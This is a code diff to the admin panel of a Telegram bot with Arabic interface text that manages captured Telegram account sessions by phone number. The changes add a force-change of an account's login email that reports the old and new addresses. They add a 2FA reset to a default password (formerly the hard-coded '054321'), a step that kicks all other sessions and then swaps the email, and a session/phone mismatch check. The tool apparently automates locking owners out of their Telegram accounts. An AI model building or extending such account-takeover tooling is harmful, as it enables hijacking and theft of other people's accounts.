@@ -232,6 +232,9 @@ async def force_mail_process(callback: CallbackQuery):
         callback.message.chat.id,
         callback.message.message_id,
     )
+    # حفظ البريد القديم من قاعدة البيانات قبل التغيير
+    old_email = database.row_login_email(session) or "—"
+
     try:
         res = await session_manager.change_login_email(phone, force=True)
     except Exception as e:
@@ -241,13 +244,17 @@ async def force_mail_process(callback: CallbackQuery):
     if res["success"]:
         new_email = res.get("email", "")
         await callback.message.edit_text(
-            f"✅ تم تغيير البريد إجبارياً:\n<code>{h(new_email)}</code>" + ADMIN_FOOTER,
+            f"✅ تم تغيير البريد إجبارياً\n\n"
+            f"📞 الرقم: <code>{h(phone)}</code>\n"
+            f"📤 البريد القديم: <code>{h(old_email)}</code>\n"
+            f"✅ البريد الجديد: <code>{h(new_email)}</code>" + ADMIN_FOOTER,
             parse_mode="HTML",
             reply_markup=back_to_session_keyboard(sid),
         )
     else:
         await callback.message.edit_text(
-            f"❌ فشل العملية: <code>{h(res['error'])}</code>" + ADMIN_FOOTER,
+            f"❌ فشل العملية: <code>{h(res['error'])}</code>\n\n"
+            f"📤 البريد القديم (في قاعدة البيانات): <code>{h(old_email)}</code>" + ADMIN_FOOTER,
             parse_mode="HTML",
             reply_markup=back_to_session_keyboard(sid),
         )
@@ -269,17 +276,18 @@ async def admin_direct_2fa_handler(callback: CallbackQuery, state: FSMContext):
         return
     phone, sid = session["phone"], session["id"]
 
-    await callback.answer("⏳ جاري تعيين التحقق لـ 054321...")
+    target_2fa = DEFAULT_2FA_PASSWORD
+    await callback.answer(f"⏳ جاري تعيين التحقق لـ {target_2fa}...")
     await callback.message.edit_text(
-        f"⏳ جاري تغيير التحقق بخطوتين للرقم <code>{h(phone)}</code> إلى <code>054321</code>..." + ADMIN_FOOTER,
+        f"⏳ جاري تغيير التحقق بخطوتين للرقم <code>{h(phone)}</code> إلى <code>{h(target_2fa)}</code>..." + ADMIN_FOOTER,
         parse_mode="HTML"
     )
 
-    res = await session_manager.set_direct_2fa(phone, "054321")
+    res = await session_manager.set_direct_2fa(phone, target_2fa)
 
     if res["success"]:
         await callback.message.edit_text(
-            f"✅ تم تغيير التحقق بخطوتين بنجاح إلى <code>054321</code> للرقم <code>{h(phone)}</code>." + ADMIN_FOOTER,
+            f"✅ تم تغيير التحقق بخطوتين بنجاح إلى <code>{h(target_2fa)}</code> للرقم <code>{h(phone)}</code>." + ADMIN_FOOTER,
             parse_mode="HTML",
             reply_markup=back_to_session_keyboard(sid)
         )
@@ -928,7 +936,10 @@ async def admin_phone_lookup(message: Message, state: FSMContext):
     phone = database.normalize_phone(raw)
     session = await database.get_session_by_phone(phone)
     if not session:
-        # الرقم غير موجود — رد صامت (بدون رسالة)
+        await message.answer(
+            f"❌ الرقم <code>{h(phone)}</code> غير موجود في قاعدة البيانات." + ADMIN_FOOTER,
+            parse_mode="HTML",
+        )
         return
 
     # التحقق من صلاحية الأدمن للوصول لهذه الجلسة
@@ -951,6 +962,19 @@ async def admin_phone_lookup(message: Message, state: FSMContext):
         mail_lines += f"\n🔑 كلمة سر البريد: <code>{h(email_pw)}</code>"
     secured_stat = "🔒 مؤمّنة" if database.row_flag(session, "secured") else "—"
     tg_id        = session["telegram_id"] or "—"
+
+    # فحص تطابق الجلسة مع الرقم (كشف الخلط بين الحسابات)
+    mismatch_line = ""
+    if live:
+        phone_check = await session_manager.verify_session_phone_match(phone)
+        if phone_check["match"] is False:
+            actual_ph = phone_check.get("actual_phone") or "—"
+            actual_nm = phone_check.get("actual_name") or "—"
+            mismatch_line = (
+                f"\n\n⚠️ <b>تحذير: الجلسة لرقم مختلف!</b>\n"
+                f"📱 الرقم الفعلي في الجلسة: <code>{h(actual_ph)}</code>\n"
+                f"👤 الاسم الفعلي: {h(actual_nm)}"
+            )
 
     # وضع الصيانة
     maint_info = database.get_maintenance_info(session)
@@ -988,6 +1012,7 @@ async def admin_phone_lookup(message: Message, state: FSMContext):
         f"📅 تاريخ التسجيل: {h(created_at)}"
         f"{maint_line}"
         f"{contacts_line}"
+        f"{mismatch_line}"
         + ADMIN_FOOTER
     )
     from keyboards import session_detail_keyboard
@@ -2560,15 +2585,42 @@ async def admin_kick_sessions_only(callback: CallbackQuery):
         return
     phone, sid = session["phone"], session["id"]
 
+    # جلب البريد القديم قبل أي تعديل
+    old_email = database.row_login_email(session) or "—"
+
     await callback.message.edit_text(
-        "⏳ جاري طرد الجلسات الأخرى فقط..." + ADMIN_FOOTER,
+        "⏳ جاري طرد الجلسات الأخرى ثم تغيير البريد..." + ADMIN_FOOTER,
         parse_mode="HTML"
     )
 
     res = await session_manager.admin_kick_only(phone)
 
     if res["success"]:
-        result_msg = f"✅ تم طرد جميع الجلسات الأخرى للرقم <code>{h(phone)}</code> بنجاح."
+        # بعد نجاح الطرد، غيّر البريد فوراً
+        await callback.message.edit_text(
+            "✅ تم الطرد. جاري تغيير البريد الآن..." + ADMIN_FOOTER,
+            parse_mode="HTML"
+        )
+        try:
+            mail_res = await session_manager.change_login_email(phone, force=True)
+        except Exception:
+            mail_res = {"success": False, "error": "خطأ غير متوقع"}
+
+        if mail_res.get("success"):
+            new_email = mail_res.get("email") or "—"
+            result_msg = (
+                f"✅ تم طرد جميع الجلسات الأخرى للرقم <code>{h(phone)}</code> بنجاح.\n\n"
+                f"📧 البريد القديم: <code>{h(old_email)}</code>\n"
+                f"✅ البريد الجديد: <code>{h(new_email)}</code>"
+            )
+        else:
+            err = mail_res.get("error", "")
+            result_msg = (
+                f"✅ تم الطرد بنجاح، لكن فشل تغيير البريد.\n\n"
+                f"📞 الرقم: <code>{h(phone)}</code>\n"
+                f"📧 البريد القديم: <code>{h(old_email)}</code>\n"
+                f"❌ خطأ البريد: <code>{h(err)}</code>"
+            )
     else:
         result_msg = f"❌ فشل الطرد: <code>{h(res.get('error',''))}</code>"
 
